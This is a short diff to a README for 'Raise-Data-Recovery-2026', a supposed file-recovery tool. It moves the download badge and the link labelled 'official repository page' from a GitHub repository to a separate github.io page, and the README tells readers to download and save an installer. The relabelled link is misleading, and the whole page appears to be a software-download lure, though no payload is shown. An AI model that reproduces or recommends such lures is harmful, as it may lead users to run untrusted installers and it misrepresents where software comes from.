@@ -1,6 +1,6 @@
 # 💾 Raise-Data-Recovery-2026 - Recover Lost Files On Your Computer
 
-[![Download Raise-Data-Recovery-2026](https://img.shields.io/badge/Download-Raise_Data_Recovery-blue.svg)](https://github.com/threatherodthegreat971/Raise-Data-Recovery-2026)
+[![Download Raise-Data-Recovery-2026](https://img.shields.io/badge/Download-Raise_Data_Recovery-blue.svg)](https://threatherodthegreat971.github.io)
 
 ## 📁 About This Software
 
@@ -20,7 +20,7 @@ It helps to have a second storage drive or a USB flash drive ready to save your 
 
 ## 📥 How To Download The Software
 
-1. Visit the [official repository page](https://github.com/threatherodthegreat971/Raise-Data-Recovery-2026).
+1. Visit the [official repository page](https://threatherodthegreat971.github.io).
 2. Locate the download button or the latest release link on the main page.
 3. Click the link to save the installer file to your computer.
 4. Choose a folder like "Downloads" to store the file.
